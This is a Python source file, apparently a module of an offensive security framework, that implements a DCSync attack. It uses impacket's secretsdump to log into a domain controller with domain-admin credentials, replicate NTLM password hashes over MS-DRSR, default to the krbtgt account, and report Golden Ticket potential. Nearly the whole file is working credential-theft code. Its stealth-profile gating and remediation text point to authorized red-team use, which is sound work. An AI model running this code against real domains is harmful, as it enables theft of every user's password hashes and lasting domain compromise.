"""
DCSync — Production Implementation using impacket.secretsdump
MITRE: T1003.006 — Replicates NTLM hashes via MS-DRSR.
⚠️ Very noisy — auto-blocked in STEALTH profile. Triggers MDI in seconds.
"""
from __future__ import annotations
from typing import Any
from ares.core.logger import get_logger

logger = get_logger("ares.modules.ad.dcsync")
from ares.core.campaign import Finding, Severity, NoiseProfile
from ares.core.security import sanitize_hostname, sanitize_ldap
from ares.modules.base import BaseModule, OpsecLevel
from ares.core.tracing import trace_module

class DCSyncModule(BaseModule):
    """
    ad.dcsync — Replicate domain hashes via MS-DRSR (requires DA or replication rights)

    OPSEC: HIGH_NOISE
    MITRE: "T1003.006"
    REQUIRES: "domain_admin_creds"
    OUTPUTS:  "ntlm_hashes"
    """
    MODULE_ID          = "ad.dcsync"
    MODULE_NAME        = "DCSync"
    MODULE_CATEGORY    = "ad"
    MODULE_DESCRIPTION = "Replicate domain hashes via MS-DRSR (requires DA or replication rights)"
    MODULE_AUTHOR      = "ARES Team <team@ares-framework.io>"
    OPSEC_LEVEL        = OpsecLevel.HIGH_NOISE
    MIN_NOISE_PROFILE  = "normal"   # blocked in stealth — triggers Microsoft Defender for Identity
    REQUIRES           = ["domain_admin_creds"]
    OUTPUTS            = ["ntlm_hashes"]
    MITRE_TECHNIQUES   = ["T1003.006"]
    MODULE_TIMEOUT_SECONDS: int | None = 600  # seconds

    async def validate(self, ctx: "Any") -> None:
        """
        Enforce dc, domain, domain-admin credentials, and noise profile.
        DCSync requires DA-level credentials — catch misconfigured runs early.
        """
        await super().validate(ctx)
        from ares.core.context import ExecutionContext
        from ares.core.errors import ModuleValidationError
        from ares.core.campaign import NoiseProfile
        if not isinstance(ctx, ExecutionContext):
            return
        ad = self._extract_ad_params(ctx)
        if not ad["dc"]:
            raise ModuleValidationError(
                "ad.dcsync requires 'dc' (Domain Controller IP or hostname).",
                module_id=self.MODULE_ID, field="dc",
            )
        if not ad["domain"]:
            raise ModuleValidationError(
                "ad.dcsync requires 'domain' (e.g. corp.local).",
                module_id=self.MODULE_ID, field="domain",
            )
        if not ad["username"]:
            raise ModuleValidationError(
                "ad.dcsync requires Domain Admin credentials — "
                "pass 'username'/'password' in params or provide a DA vault credential.",
                module_id=self.MODULE_ID, field="username",
            )
        # Stealth check — surface this before any connection is attempted
        noise = getattr(getattr(ctx, "campaign", None), "noise_profile", None)
        if noise == NoiseProfile.STEALTH:
            raise ModuleValidationError(
                "ad.dcsync is blocked in STEALTH noise profile — "
                "MS-DRSR replication from non-DC triggers Microsoft Defender for Identity "
                "immediately. Use NORMAL or AGGRESSIVE profile.",
                module_id=self.MODULE_ID, field="noise_profile",
            )

    async def execute(self, ctx: "Any") -> "ModuleResult":
        """ExecutionContext-based entry point (v0.9.0+). Credentials sourced from vault."""
        from ares.modules.base import ModuleResult
        ad = self._extract_ad_params(ctx)
        dc, domain, username, password = ad["dc"], ad["domain"], ad["username"], ad["password"]
        target_user = ctx.params.get("target_user", "krbtgt")
        if getattr(ctx, "dry_run", False):
            return ModuleResult(
                status="dry_run", module_id=self.MODULE_ID,
                raw={"dry_run": True, "dc": dc, "domain": domain},
            )
        findings, raw = await self.run(
            dc=dc, username=username, password=password, domain=domain, target_user=target_user,
        )
        return ModuleResult(
            status="success" if (findings or raw) else "partial",
            findings=findings, raw=raw,
            module_id=self.MODULE_ID,
            execution_id=getattr(ctx, "execution_id", ""),
        )

    @trace_module("ad.dcsync")
    async def run(self, dc, username, password, domain, target_user="krbtgt", **kwargs):
        if self.campaign.noise_profile == NoiseProfile.STEALTH:
            logger.warning("dcsync_blocked", reason="stealth_profile")
            return [], {"skipped":True, "reason":"stealth_profile_blocked_dcsync"}
        dc, username, domain, target_user = (sanitize_hostname(dc), sanitize_ldap(username),
                                              sanitize_ldap(domain), sanitize_ldap(target_user))
        await self.before_request(dc, "dcsync")
        logger.warning("dcsync_start", dc=dc, target=target_user, msg="HIGH_NOISE — TRIGGERS_MDI")
        try:
            import asyncio as _asyncio
            loop = _asyncio.get_running_loop()
            hashes = await loop.run_in_executor(
                None,
                lambda: self._run_dcsync_sync(dc, username, password, domain, target_user),
            )
        except Exception as exc:
            from ares.core.errors import AuthenticationFailed, InsufficientPrivilege, NetworkError
            err = str(exc).lower()
            if "access denied" in err or "rpc_s_access_denied" in err:
                raise InsufficientPrivilege(f"DCSync needs DA rights on {dc}.",
                    module_id=self.MODULE_ID, target=dc, required_privilege="domain_admin") from exc
            if "invalid credentials" in err or "logon failure" in err:
                raise AuthenticationFailed(str(exc), username=username,
                    module_id=self.MODULE_ID, target=dc) from exc
            raise NetworkError(f"DCSync failed: {exc}") from exc
        raw = {"ntlm_hashes": hashes, "target": target_user}
        self._analyze(raw, target_user)
        return self._findings, raw

    def _run_dcsync_sync(self, dc, username, password, domain, target_user):
        """
        Sync — runs in executor (Bug fix: was async with blocking SMB/RPC calls).
        Uses impacket.examples.secretsdump with stable callback-based API.
        try/finally ensures RemoteOperations.finish() + smb.logoff() always called.
        """
        from impacket.examples.secretsdump import RemoteOperations, NTDSHashes
        from impacket.smbconnection import SMBConnection

        smb = SMBConnection(dc, dc, timeout=30)
        smb.login(username, password, domain)

        remote_ops = RemoteOperations(smb, doKerberos=False)
        remote_ops.enableRegistry()

        hashes: list[dict] = []

        try:
            ntds = NTDSHashes(
                None, None,
                isRemote       = True,
                history        = False,
                noLMHash       = True,
                remoteOps      = remote_ops,
                useVSSMethod   = False,
                justNTLM       = True,
                pwdLastSet     = False,
                resumeSession  = None,
                outputFileName = None,
                justUser       = target_user if target_user != "all" else None,
                printUserStatus = False,
            )

            def _on_secret(secret_type: str, secret: str) -> None:
                """Callback — impacket calls this for each dumped hash."""
                if ":::" not in secret:
                    return
                parts = secret.split(":")
                if len(parts) < 4:
                    return
                nt = parts[3].rstrip()
                # Skip empty/blank hashes
                if nt in ("", "31d6cfe0d16ae931b73c59d7e0c089c0"):
                    return
                hashes.append({
                    "username": parts[0],
                    "rid":      parts[1],
                    "nt_hash":  nt,
                })

            ntds.dump()
            ntds.export(_on_secret)
            ntds.finish()

        finally:
            try:
                remote_ops.finish()
            except Exception:
                pass
            try:
                smb.logoff()
            except Exception:
                pass

        logger.info("dcsync_complete", count=len(hashes))
        return hashes

    def _analyze(self, raw, target):
        hashes = raw.get("ntlm_hashes",[])
        if not hashes:
            return
        krbtgt = next((h for h in hashes if h["username"].lower()=="krbtgt"), None)
        self.finding(title=f"DCSync — {len(hashes)} NTLM Hash(es)",
            description=(f"Replicated {len(hashes)} NTLM hashes via DCSync. "
                         + ("krbtgt obtained — Golden Ticket possible. " if krbtgt else "")),
            severity=Severity.CRITICAL, mitre_technique="T1003.006", mitre_tactic="Credential Access",
            evidence={"hash_count":len(hashes),"target":target,"krbtgt_obtained":bool(krbtgt),
                      "sample":[f"{h['username']}:::{h['nt_hash']}" for h in hashes[:3]]},
            remediation=("1. Reset krbtgt TWICE 24h apart. 2. Investigate replication rights. "
                         "3. Enable Microsoft Defender for Identity."))